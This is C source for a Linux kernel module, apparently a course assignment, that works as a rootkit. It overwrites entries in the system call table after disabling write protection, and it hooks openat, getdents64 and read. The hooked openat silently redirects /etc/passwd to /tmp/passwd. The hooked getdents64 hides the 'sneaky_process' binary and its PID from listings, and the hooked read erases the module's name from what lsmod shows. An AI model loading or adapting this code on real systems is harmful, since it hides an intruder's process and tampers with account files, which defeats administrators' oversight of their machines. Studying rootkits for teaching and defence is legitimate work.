#include <asm/cacheflush.h>
#include <asm/current.h>  // process information
#include <asm/page.h>
#include <asm/unistd.h>  // for system call constants
#include <linux/dirent.h>
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>  // for printk and other kernel bits
#include <linux/module.h>  // for all modules
#include <linux/sched.h>
// import for ssize_t
#include <linux/fs.h>

#define PREFIX "sneaky_process"

// This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)ptr, &level);
    // if PTE is not writable, set it to writable
    if (pte->pte & ~_PAGE_RW) {
        pte->pte |= _PAGE_RW;
    }
    return 0;
}

int disable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)ptr, &level);
    // change PTE to read-only
    pte->pte = pte->pte & ~_PAGE_RW;
    return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
/**
 * @brief sneaky_sys_openat is the new openat syscall
 * @param regs is the register
 * @return int
 */
asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
    // Implement the sneaky part here

    // regs->si saves the path of the file to be opened in openat syscall
    char *original_si = (char *)regs->si;
    // when command is accessing /etc/passwd through openat syscall
    if (strcmp(original_si, "/etc/passwd") == 0) {
        // replace /etc/passwd with /tmp/passwd using copy_to_user
        copy_to_user((char *)regs->si, "/tmp/passwd", strlen("/tmp/passwd"));
    }
    return (*original_openat)(regs);
}





/* for #1 and #2: hide sneaky_process from ls, cd, find; hide /proc/sneaky_process_id and ps - a -u */

asmlinkage int (*original_getdents64)(struct pt_regs *regs);

static char *sneaky_pid = "";
module_param(sneaky_pid, charp, 0);

/**
 * @brief isSneakyProcess is a helper function to check if the process is sneaky_process
 */
bool isSneakyProcess(struct linux_dirent64 *dirent) {
    if (strcmp(dirent->d_name, PREFIX) == 0 || strcmp(dirent->d_name, sneaky_pid) == 0) {
        return true;
    }
    return false;
}

/**
 * sneaky version of getdents64 syscall, which reads directory entries from the
 * specified directory file descriptor,  and fills the directory entries it reads
 * into a buffer in user space. The sneaky version would ignore the snkeay_process
 */
asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
    // call original getdents64, and save bytes
    int length = original_getdents64(regs);

    // get the start address of the linux_dirent struct
    //struct linux_dirent64 *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64* dirent = (void*)(regs->si);

    int offset = 0;

    // if (isSneakyProcess(dirent)) {
    // 	// if the first entry is sneaky_process, then skip it
    // 	offset += dirent->d_reclen;
    // 	// delete the sneaky_process from the buffer
    // 	memmove((char *)dirent, (char *)dirent + offset, length - dirent->d_reclen);
    //   length -= dirent->d_reclen;
    // } else {
    while (offset < length) {
        struct linux_dirent64* temp = (void*)dirent + offset;
        //struct linux_dirent64 *temp = (struct linux_dirent64 *)((char *)dirent + offset);
        if (isSneakyProcess(temp)) {
            // delete the sneaky_process from the buffer
            memmove((void *)temp, (void *)temp + (int)(temp->d_reclen), length - (int)(temp->d_reclen) - offset);
            length -= (int)(temp->d_reclen);
        } else {
            offset += (int)(temp->d_reclen);
        }
    }
    return length;
}


// static char* pid = "";
// module_param(pid, charp, 0);

// asmlinkage int sneaky_getdents64(struct pt_regs* regs){
//   int totalDirpLength = original_getdents64(regs);
//   struct linux_dirent64* dirp = (void*)(regs->si);

//   int curr = 0;
//   while(curr < totalDirpLength){
//     struct linux_dirent64* dirpTemp = (void*)dirp + curr;
//     if(strcmp(dirpTemp->d_name, "sneaky_process") == 0 || strcmp(dirpTemp->d_name, pid) == 0){
//       int reclen = dirpTemp->d_reclen;
//       int lenToBeCopied = ((void*)dirp + totalDirpLength) - ((void*)dirpTemp + reclen);
//       void* source = (void*)dirpTemp + reclen;
//       memmove((void*)(regs->si) + curr, source, lenToBeCopied);
//       totalDirpLength -= reclen;
//     }
//     else{
//       curr += dirpTemp->d_reclen;
//     }
//   }
//   return totalDirpLength;
// }




asmlinkage ssize_t (*original_read)(struct pt_regs *regs);

char * findPos(char* start, const char * target, ssize_t length) {
    char * pos = strnstr(start, target, length);
    return pos;
}

asmlinkage ssize_t sneaky_read(struct pt_regs *regs) {
    ssize_t length = (*original_read)(regs);
    void * begin = (void *)regs->si;
    char * first = findPos((char *)begin, "sneaky_mod", length);
    if (first != NULL) {
        char * second = findPos((char *)first, "\n", length - (first - (char *)begin));
        if (second != NULL) {
            memmove(first, second + 1, length - (second - (char *)begin) - 1);
            length = length - (ssize_t)(second - first) - 1;
        }
    }
    return length;
}

// asmlinkage ssize_t (*original_read)(struct pt_regs *);

// /**
//  * @brief sneaky read
//  *
//  * @param regs
//  * @return asmlinkage
//  */
// asmlinkage ssize_t sneaky_read(struct pt_regs *regs) {
//     ssize_t bytesRead = original_read(regs);

//     if (bytesRead > 0) {
//         void *posStart = strnstr((char *)(regs->si), "sneaky_mod", bytesRead);
//         if (posStart != NULL) {
//             void *posEnd = strnstr(posStart, "\n", bytesRead - (posStart - (void *)(regs->si)));
//             if (posEnd != NULL) {
//                 int size = posEnd - posStart + 1;
//                 memmove(posStart, posEnd + 1, bytesRead - (posStart - (void *)(regs->si)) - size);
//                 bytesRead -= size;
//             }
//         }
//     }
//     return bytesRead;
// }

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
    // See /var/log/syslog or use `dmesg` for kernel print output
    printk(KERN_INFO "Sneaky module being loaded.\n");

    // Lookup the address for this symbol. Returns 0 if not found.
    // This address will change after rebooting due to protection
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    // This is the magic! Save away the original 'openat' system call
    // function address. Then overwrite its address in the system call
    // table with the function address of our new code.
    original_openat = (void *)sys_call_table[__NR_openat];
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    original_read = (void *)sys_call_table[__NR_read];

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void *)sys_call_table);

    sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
    sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
    sys_call_table[__NR_read] = (unsigned long)sneaky_read;

    // You need to replace other system calls you need to hack here

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void *)sys_call_table);

    return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
    printk(KERN_INFO "Sneaky module being unloaded.\n");

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void *)sys_call_table);

    // This is more magic! Restore the original 'open' system call
    // function address. Will look like malicious code was never there!
    sys_call_table[__NR_openat] = (unsigned long)original_openat;
    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    sys_call_table[__NR_read] = (unsigned long)original_read;

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");